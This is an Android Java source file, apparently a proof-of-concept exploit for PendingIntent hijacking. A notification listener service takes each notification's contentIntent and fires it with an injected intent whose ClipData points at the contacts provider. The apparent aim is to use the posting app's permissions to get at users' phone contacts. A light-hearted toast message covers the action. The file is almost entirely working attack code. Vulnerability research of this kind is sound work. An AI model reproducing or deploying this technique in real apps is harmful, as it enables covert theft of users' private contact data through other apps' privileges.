package com.example.notificationcve;

import android.app.PendingIntent;
import android.app.Service;
import android.content.ClipData;
import android.content.Intent;
import android.net.Uri;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.widget.Toast;

public class ListenService extends NotificationListenerService {
    final static String tag = "ListenService";

    @Override
    public void onCreate() {
        Log.i("Kathy","onCreate - Thread ID = " + Thread.currentThread().getId());
        super.onCreate();
    }

    @Override
    public void onDestroy() {
        Log.i("Kathy", "onDestroy - Thread ID = " + Thread.currentThread().getId());
        super.onDestroy();
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        PendingIntent pi = sbn.getNotification().contentIntent;
        Toast.makeText(getBaseContext(), "收到告白啦~",Toast.LENGTH_LONG).show();
        Log.i(tag, "!!!");

        Intent hijackIntent = new Intent();
        hijackIntent.setClipData(ClipData.newRawUri(null, Uri.parse("content://contacts/phones")));
//        hijackIntent.setAction("com.example.notificationcve.my");
//        hijackIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        startActivity(hijackIntent);


        try {
            pi.send(getApplicationContext(), 0, hijackIntent, null, null);
        } catch (PendingIntent.CanceledException e) {
            e.printStackTrace();
        }

    }
}
